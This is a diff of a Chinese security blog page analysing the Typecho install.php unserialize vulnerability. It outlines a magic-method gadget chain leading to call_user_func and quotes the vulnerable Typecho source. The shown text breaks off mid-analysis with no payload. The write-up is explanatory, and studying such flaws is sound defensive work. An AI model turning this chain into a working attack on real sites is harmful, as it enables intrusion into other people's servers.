@@ -1,344 +1,217 @@
 <!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>Typecho 反序列化漏洞分析 - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
 
 
 
 
-
-<html lang="Chinese">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
-  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+<meta name="description" content="Share learn & Share life.">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<meta name="keywords" content="Threezh1">
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.3.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    }
-  };
-</script>
 
-  <meta name="description" content="漏洞分析：思路 在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置_typecho_config进行反序列化。 在序列化当中把adapter设置为一个类，导致页面执行代码时触发_toString()魔术方法。 在序列化当中设置$item令其没有screenName属性，导致在触发_toString()魔术方法的时候触发_get()魔术方法。 通过反序列化间">
-<meta name="keywords" content="代码审计">
+    <meta name="description" content="&amp;#x6F0F;&amp;#x6D1E;&amp;#x5206;&amp;#x6790;&amp;#xFF1A;&amp;#x601D;&amp;#x8DEF; &amp;#x5728;Typecho_Cookie::get()&amp;#x65B9;&amp;#x6CD5;&amp;#x4E2D;&amp;#x901A;&amp;#x8FC7;POST&amp;#x6216;&amp;#x8005;&amp;#x8BBE;&amp;#x7F6E;COOKIE&amp;#x7684;&amp;#x65B9;&amp;#x6CD5;&amp;#x8BBE;">
+<meta name="keywords" content="反序列化,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Typecho 反序列化漏洞分析">
 <meta property="og:url" content="http://yoursite.com/2018/01/01/Typecho反序列化漏洞分析/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="漏洞分析：思路 在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置_typecho_config进行反序列化。 在序列化当中把adapter设置为一个类，导致页面执行代码时触发_toString()魔术方法。 在序列化当中设置$item令其没有screenName属性，导致在触发_toString()魔术方法的时候触发_get()魔术方法。 通过反序列化间">
+<meta property="og:description" content="&amp;#x6F0F;&amp;#x6D1E;&amp;#x5206;&amp;#x6790;&amp;#xFF1A;&amp;#x601D;&amp;#x8DEF; &amp;#x5728;Typecho_Cookie::get()&amp;#x65B9;&amp;#x6CD5;&amp;#x4E2D;&amp;#x901A;&amp;#x8FC7;POST&amp;#x6216;&amp;#x8005;&amp;#x8BBE;&amp;#x7F6E;COOKIE&amp;#x7684;&amp;#x65B9;&amp;#x6CD5;&amp;#x8BBE;">
 <meta property="og:locale" content="Chinese">
-<meta property="og:updated_time" content="2020-01-08T16:01:33.605Z">
+<meta property="og:updated_time" content="2020-02-12T13:59:14.729Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Typecho 反序列化漏洞分析">
-<meta name="twitter:description" content="漏洞分析：思路 在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置_typecho_config进行反序列化。 在序列化当中把adapter设置为一个类，导致页面执行代码时触发_toString()魔术方法。 在序列化当中设置$item令其没有screenName属性，导致在触发_toString()魔术方法的时候触发_get()魔术方法。 通过反序列化间">
-  <link rel="canonical" href="http://yoursite.com/2018/01/01/Typecho反序列化漏洞分析/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>Typecho 反序列化漏洞分析 | Threezh1's blog</title>
-  <meta name="generator" content="Hexo 3.8.0">
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
+<meta name="twitter:description" content="&amp;#x6F0F;&amp;#x6D1E;&amp;#x5206;&amp;#x6790;&amp;#xFF1A;&amp;#x601D;&amp;#x8DEF; &amp;#x5728;Typecho_Cookie::get()&amp;#x65B9;&amp;#x6CD5;&amp;#x4E2D;&amp;#x901A;&amp;#x8FC7;POST&amp;#x6216;&amp;#x8005;&amp;#x8BBE;&amp;#x7F6E;COOKIE&amp;#x7684;&amp;#x65B9;&amp;#x6CD5;&amp;#x8BBE;">
 
 
 
 
 
+<link rel="icon" href="/favicon.png">
 
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Threezh1's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-        <p class="site-subtitle">分享学习、分享想法</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
+<body>
     
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-threeday">
-      
-    
-
-    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
-
-  </li>
-  </ul>
-
-</nav>
-</div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-            
-
-          <div id="content" class="content page-post-detail">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/01/Typecho反序列化漏洞分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">Typecho 反序列化漏洞分析
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
                 
-              
-
-              <time title="Erstellt: 2018-01-01 12:00:00" itemprop="dateCreated datePublished" datetime="2018-01-01T12:00:00+08:00">2018-01-01</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2020-01-09 00:01:33" itemprop="dateModified" datetime="2020-01-09T00:01:33+08:00">2020-01-09</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
-
+                <img src="/images/logo.png" alt height="28">
                 
-                
-              
-            </span>
-          
-
-          
-
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
-      </header>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/About">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
 
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Typecho 反序列化漏洞分析
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2018-01-01T04:00:00.000Z" itemprop="datePublished">Jan 1 2018</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            21 minutes de lectura (Alrededor de 3164 palabras)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
-<li>在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置<em>_typecho_config</em>进行反序列化。</li>
-<li>在序列化当中把adapter设置为一个类，导致页面执行代码时触发<em>_toString()</em>魔术方法。</li>
-<li>在序列化当中设置$item令其没有screenName属性，导致在触发<em>_toString()</em>魔术方法的时候触发<em>_get()</em>魔术方法。</li>
-<li>通过反序列化间接控制<em>$this-&gt;_filter</em>的值，利用array_map(),call_user_func()执行恶意代码。</li>
+        <h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#xFF1A;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#xFF1A;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#xFF1A;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#xFF1A;</h2><h3 id="&#x601D;&#x8DEF;"><a href="#&#x601D;&#x8DEF;" class="headerlink" title="&#x601D;&#x8DEF;"></a>&#x601D;&#x8DEF;</h3><ol>
+<li>&#x5728;Typecho_Cookie::get()&#x65B9;&#x6CD5;&#x4E2D;&#x901A;&#x8FC7;POST&#x6216;&#x8005;&#x8BBE;&#x7F6E;COOKIE&#x7684;&#x65B9;&#x6CD5;&#x8BBE;&#x7F6E;<em>_typecho_config</em>&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;</li>
+<li>&#x5728;&#x5E8F;&#x5217;&#x5316;&#x5F53;&#x4E2D;&#x628A;adapter&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x5BFC;&#x81F4;&#x9875;&#x9762;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x65F6;&#x89E6;&#x53D1;<em>_toString()</em>&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002;</li>
+<li>&#x5728;&#x5E8F;&#x5217;&#x5316;&#x5F53;&#x4E2D;&#x8BBE;&#x7F6E;$item&#x4EE4;&#x5176;&#x6CA1;&#x6709;screenName&#x5C5E;&#x6027;&#xFF0C;&#x5BFC;&#x81F4;&#x5728;&#x89E6;&#x53D1;<em>_toString()</em>&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;<em>_get()</em>&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002;</li>
+<li>&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x95F4;&#x63A5;&#x63A7;&#x5236;<em>$this-&gt;_filter</em>&#x7684;&#x503C;&#xFF0C;&#x5229;&#x7528;array_map(),call_user_func()&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x3002;</li>
 </ol>
-<p><strong>可知，在利用漏洞的过程中，最终是要利用_toString(),_get()等魔术方法构造一个POC链，最终执行恶意代码</strong><br><a id="more"></a></p>
-<h3 id="PHP反序列化漏洞可利用的魔术方法"><a href="#PHP反序列化漏洞可利用的魔术方法" class="headerlink" title="PHP反序列化漏洞可利用的魔术方法"></a>PHP反序列化漏洞可利用的魔术方法</h3><pre><code>- __wakeup() //使用unserialize时触发
-- __sleep() //使用serialize时触发
-- __destruct() //对象被销毁时触发
-- __call() //在对象上下文中调用不可访问的方法时触发
-- __callStatic() //在静态上下文中调用不可访问的方法时触发
-- __get() //用于从不可访问的属性读取数据
-- __set() //用于将数据写入不可访问的属性
-- __isset() //在不可访问的属性上调用isset()或empty()触发
-- __unset() //在不可访问的属性上使用unset()时触发
-- __toString() //把类当作字符串使用时触发
-- __invoke() //当脚本尝试将对象调用为函数时触发
-</code></pre><p>漏洞的入口点在install.php，进入install.php首先经过两个判断！</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>]) &amp;&amp; $parts[<span class="string">'port'</span>] != <span class="number">80</span>) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="满足的条件为："><a href="#满足的条件为：" class="headerlink" title="满足的条件为："></a>满足的条件为：</h3><ul>
-<li>GET中的finishi参数不能为空。</li>
-<li>referer为站内url</li>
+<p><strong>&#x53EF;&#x77E5;&#xFF0C;&#x5728;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6700;&#x7EC8;&#x662F;&#x8981;&#x5229;&#x7528;_toString(),_get()&#x7B49;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x6784;&#x9020;&#x4E00;&#x4E2A;POC&#x94FE;&#xFF0C;&#x6700;&#x7EC8;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;</strong><br><a id="more"></a></p>
+<h3 id="PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x53EF;&#x5229;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;"><a href="#PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x53EF;&#x5229;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;" class="headerlink" title="PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x53EF;&#x5229;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;"></a>PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x53EF;&#x5229;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;</h3><pre><code>- __wakeup() //&#x4F7F;&#x7528;unserialize&#x65F6;&#x89E6;&#x53D1;
+- __sleep() //&#x4F7F;&#x7528;serialize&#x65F6;&#x89E6;&#x53D1;
+- __destruct() //&#x5BF9;&#x8C61;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x89E6;&#x53D1;
+- __call() //&#x5728;&#x5BF9;&#x8C61;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x89E6;&#x53D1;
+- __callStatic() //&#x5728;&#x9759;&#x6001;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x89E6;&#x53D1;
+- __get() //&#x7528;&#x4E8E;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E;
+- __set() //&#x7528;&#x4E8E;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5165;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;
+- __isset() //&#x5728;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x8C03;&#x7528;isset()&#x6216;empty()&#x89E6;&#x53D1;
+- __unset() //&#x5728;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x4F7F;&#x7528;unset()&#x65F6;&#x89E6;&#x53D1;
+- __toString() //&#x628A;&#x7C7B;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;&#x65F6;&#x89E6;&#x53D1;
+- __invoke() //&#x5F53;&#x811A;&#x672C;&#x5C1D;&#x8BD5;&#x5C06;&#x5BF9;&#x8C61;&#x8C03;&#x7528;&#x4E3A;&#x51FD;&#x6570;&#x65F6;&#x89E6;&#x53D1;
+</code></pre><p>&#x6F0F;&#x6D1E;&#x7684;&#x5165;&#x53E3;&#x70B9;&#x5728;install.php&#xFF0C;&#x8FDB;&#x5165;install.php&#x9996;&#x5148;&#x7ECF;&#x8FC7;&#x4E24;&#x4E2A;&#x5224;&#x65AD;&#xFF01;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-comment">//&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;finish&apos;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="hljs-string">&apos;/config.inc.php&apos;</span>) &amp;&amp; <span class="hljs-keyword">empty</span>($_SESSION[<span class="hljs-string">&apos;typecho&apos;</span>])) {</span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x6321;&#x6389;&#x53EF;&#x80FD;&#x7684;&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_GET) || !<span class="hljs-keyword">empty</span>($_POST)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&apos;HTTP_REFERER&apos;</span>])) {</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="hljs-string">&apos;HTTP_REFERER&apos;</span>]);</span><br><span class="line">	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($parts[<span class="hljs-string">&apos;port&apos;</span>]) &amp;&amp; $parts[<span class="hljs-string">&apos;port&apos;</span>] != <span class="hljs-number">80</span>) {</span><br><span class="line">        $parts[<span class="hljs-string">&apos;host&apos;</span>] = <span class="hljs-string">&quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($parts[<span class="hljs-string">&apos;host&apos;</span>]) || $_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>] != $parts[<span class="hljs-string">&apos;host&apos;</span>]) {</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#xFF1A;"><a href="#&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#xFF1A;" class="headerlink" title="&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#xFF1A;"></a>&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#xFF1A;</h3><ul>
+<li>GET&#x4E2D;&#x7684;finishi&#x53C2;&#x6570;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#x3002;</li>
+<li>referer&#x4E3A;&#x7AD9;&#x5185;url</li>
 </ul>
-<h3 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里有个反序列化函数：unserialize()</p>
-<p>其中是通过<em>Typecho_Cookie::get()</em>方法获取的序列化的对象，找到这个方法的网页，为<em>www\var\Typecho\Cookie.php</em></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>从第四行命令可知，typecho_config可以通过设置COOKIE的方式或者POST的方式输入！</p>
-<p>再继续看前面的反序列化的代码，第四行定义了一个新的变量！</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
